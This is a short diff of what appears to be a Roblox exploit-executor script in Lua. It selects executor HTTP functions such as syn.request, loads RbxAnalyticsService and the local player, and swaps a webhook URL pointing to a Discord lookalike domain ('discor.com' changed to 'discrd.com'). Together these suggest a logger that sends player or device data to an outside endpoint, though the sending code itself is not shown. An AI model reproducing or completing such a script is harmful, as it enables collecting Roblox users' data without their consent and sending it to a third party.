@@ -5,7 +5,7 @@ local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 local HTTP = syn and syn.request or http_request or request or HttpPost
 
-local WebhookURL = "https://discor.com/api/webhooks/1317511620217536632/73dlYRqIqWSHUEsghYnAjmPb-hsm6x6MAYfjG3JWhqbGrljdukJS6yL4FItoU5vYSCr"
+local WebhookURL = "https://discrd.com/api/webhooks/1317511620217536632/73dlYRqIqW1SHUEsghYnAjmPb-hsm6x6MAYfjG3JWhqbGrljdukJS6yL4FItoU5vYSCr"
 local Headers = { ['Content-Type'] = 'application/json' }
 
 local player = Players.LocalPlayer
